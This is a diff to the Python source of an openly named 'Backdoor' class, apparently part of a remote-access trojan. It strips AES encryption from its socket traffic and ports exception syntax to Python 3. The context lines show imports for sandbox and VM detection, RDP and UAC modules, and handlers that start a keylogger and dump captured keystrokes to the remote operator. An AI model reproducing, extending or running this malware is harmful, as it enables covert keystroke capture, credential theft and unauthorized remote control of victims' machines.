@@ -1,7 +1,7 @@
-#!/usr/bin/python
+
 
 import lib.keylogger
-from lib.AES_cipher import AESCipher
+#from lib.AES_cipher import AESCipher
 from lib.chdir import chdir
 from lib.check_sandbox import detectSandboxie
 from lib.check_vm import detectVM
@@ -16,6 +16,7 @@ from lib.RDP import *
 from lib.UAC import *
 from lib.display import *
 from lib.env import get_env
+from lib.setting import *
 
 global connected, sock
 
@@ -35,20 +36,20 @@ class Backdoor:
                     continue
 
     # encrypt/decrypt data ###############################################################
-    def encrypt(self, message):
-        encrypted = AESCipher(password).encrypt(message)
-        return encrypted
+#    def encrypt(self, message):
+#        encrypted = AESCipher(password).encrypt(message)
+#        return encrypted
 
-    def decrypt(self, message):
-        decrypted = AESCipher(password).decrypt(message)
-        return decrypted
+#    def decrypt(self, message):
+#        decrypted = AESCipher(password).decrypt(message)
+#        return decrypted
 
     # send/receive data ########################################################
     def json_send(self, data):
         try:
             json_data = json.dumps(data)
-            return self.sock.send(self.encrypt(json_data))
-        except Exception,e:
+            return self.sock.send(json_data)
+        except Exception as e:
             return e
             pass
 
@@ -57,7 +58,7 @@ class Backdoor:
         while True:
             try:
                 json_data = json_data + self.sock.recv(1000000)
-                return json.loads(self.decrypt(json_data))
+                return json.loads(json_data)
             except ValueError:
                 continue
             except:
@@ -132,7 +133,7 @@ class Backdoor:
                     try:
                         t1.start()
                         result = "\033[1;32;32m[+]\x1b[0m key logger started \033[1;32;32m[+]\x1b[0m"
-                    except Exception, e:
+                    except Exception as e:
                         result = "\033[1;32;31m[-]\x1b[0m failed to start keylogger \033[1;32;31m[-]\x1b[0m\n" + str(e)
                         pass
             elif cmd[0] == "key_dump":
@@ -145,7 +146,7 @@ class Backdoor:
                         result = subprocess.check_output("cat " + lib.keylogger.keylogger_path, shell=True,
                                                          stderr=subprocess.STDOUT)
 
-                except Exception, e:
+                except Exception as e:
                     result = "\033[1;32;31m[-]\x1b[0m failed to dump key logs \033[1;32;31m[-]\x1b[0m\n" + str(e)
                     pass
             elif cmd[0] == "key_stop":
